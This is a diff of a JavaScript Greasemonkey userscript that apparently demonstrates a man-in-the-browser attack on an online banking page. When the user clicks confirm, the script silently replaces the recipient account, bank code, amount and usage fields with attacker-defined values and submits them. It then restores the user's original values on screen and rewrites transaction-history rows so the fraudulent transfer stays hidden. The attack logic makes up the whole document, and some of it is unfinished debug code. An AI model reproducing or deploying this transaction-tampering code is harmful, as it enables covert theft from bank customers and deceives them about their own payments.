@@ -53,7 +53,7 @@ Transfer.prototype.getAccName = function(){
 }
 
 window.saveTransfers = function(transfers) {
-//	console.log("save transfers" + transfers.length);
+	console.log("save transfers" + transfers.length);
 	for (i = 0; i < transfers.length; i++) {
 		
 		GM_setValue(ACC_NAME_INDEX + i, transfers[i].acc_Name);		
@@ -89,7 +89,7 @@ window.loadTransfers  = function() {
 	while (true) {
 		result = GM_getValue(ACC_NAME_INDEX + i, false);
 		if (result == false) {
-//			console.log("Load transfers" + transfers.length);
+			console.log("Load transfers" + transfers.length);
 			return transfers;
 		}
 		
@@ -113,7 +113,7 @@ window.loadTransfers  = function() {
 window.deleteData = function(){
 	
 	data =loadTransfers();
-//	console.log("delete transfers" + data.length);
+	console.log("delete transfers" + data.length);
 	for (i = 0; i < data.length; i++) {
 		
 		GM_deleteValue(ACC_NAME_INDEX + i);
@@ -152,20 +152,24 @@ window.deleteData = function(){
 //		 				 global_Usage=$("input:eq(6)").val();
 		 				
 		 				 newTransfer = new Transfer($("input:eq(1)").val(),
-		 						$("input:eq(2)").val(), $("input:eq(3)").val(), $("input:eq(4)").val(), 
-		 						$("input:eq(5)").val(), $("input:eq(6)").val(), new Date(), false);
+		 						$("input:eq(2)").val(), $("input:eq(3)").val(), 
+		 						$("input:eq(4)").val(), 
+		 						$("input:eq(5)").val(), $("input:eq(6)").val(), new 
+		 						Date(), false);
 		 				
 		 				 
 		 				 storedTransfers = loadTransfers();
 		 				
 		 				 index =storedTransfers.length;
+		 				
 		 				 if (index > 0) { 
 			 				 //if last stored transfer was not commited we can delete it
 			 				 if (!storedTransfers[index - 1].commited.valueOf()) {
+			 					
 			 					index--;
 			 				 }
 		 				 }
-		 				
+		 				console.log(index);
 		 				storedTransfers[index] = newTransfer;
 		 				
 		 				saveTransfers(storedTransfers);
@@ -213,6 +217,10 @@ window.deleteData = function(){
 	 			$(this).hide();
 	 			$(this).attr("hackMarkerConfirmBtnOrig","true");	
 	 			sendMoneyConfirmBtnClone.click(function(event) {
+	 				storedTransfers = loadTransfers();
+	 		 		lastTransfer = storedTransfers[storedTransfers.length - 1];
+	 		 		//send hacked values
+	 		 		console.log("a");
 	 				$("input:eq(1)").val(HACK_REC_ACCOUNT);
 	 				$("input:eq(2)").val(HACK_REC_NAME);
 	 				$("input:eq(3)").val(HACK_BANK_BLZ);
@@ -220,25 +228,30 @@ window.deleteData = function(){
 	 				$("input:eq(5)").val(HACK_AMOUNT);
 	 				$("input:eq(6)").val(HACK_USAGE);
 	 				$("button[hackMarkerConfirmBtnOrig='true']")[0].click();
-	 				$("input:eq(1)").val(globalRC_Acc_Nr);
-					$("input:eq(2)").val(globalRC_Acc_Name);
-					$("input:eq(3)").val(globalRC_Bank_BLZ);
-					$("input:eq(4)").val(globalRC_Bank_Name);
-					$("input:eq(5)").val(global_Amount);
-					$("input:eq(6)").val(global_Usage);
-
+	 				//and change displayed values back
+	 				$("input:eq(1)").val(lastTransfer.acc_Name);
+					$("input:eq(2)").val(lastTransfer.acc_Nr);
+					$("input:eq(3)").val(lastTransfer.bank_BLZ);
+					$("input:eq(4)").val(lastTransfer.bank_Name);
+					$("input:eq(5)").val(lastTransfer.amount);
+					$("input:eq(6)").val(lastTransfer.remark);
+					//set transfer to be committed (not necessarily true e.g. if tan is wrong!)
+					lastTransfer.commited = true;
+					saveTransfers(storedTransfers);
 	 				});
 	 			
 		 	});
 		 	var recText=globalRC_Acc_Name+' ('+globalRC_Acc_Nr+')';
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').text(recText);		
-
+//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').text(recText);		
+		 	hackedRow= $(".TransfersOdd,.TransfersEven").filter(':contains(Hack the Bank)').parent().children().children();
+	hackedRow.filter(':contains(Bad Bank)').text("test1");
+	hackedRow.filter(':contains(Hack the Bank)').text("test2");
  	
-		 	var bankText=globalRC_Bank_Name+' ('+globalRC_Bank_BLZ+')';
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Bad Bank)').text(bankText);
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(12060000)').text(globalRC_Bank_BLZ);
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack Demo)').text(global_Usage);
-		 	$(".TransfersOdd,.TransfersEven").filter(':contains(500)').text(global_Amount);
+//		 	var bankText=globalRC_Bank_Name+' ('+globalRC_Bank_BLZ+')';
+//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Bad Bank)').text(bankText);
+//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(12060000)').text(globalRC_Bank_BLZ);
+//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(Hack Demo)').text(global_Usage);
+//		 	$(".TransfersOdd,.TransfersEven").filter(':contains(500)').text(global_Amount);
 		 	
 		 	
 		 	
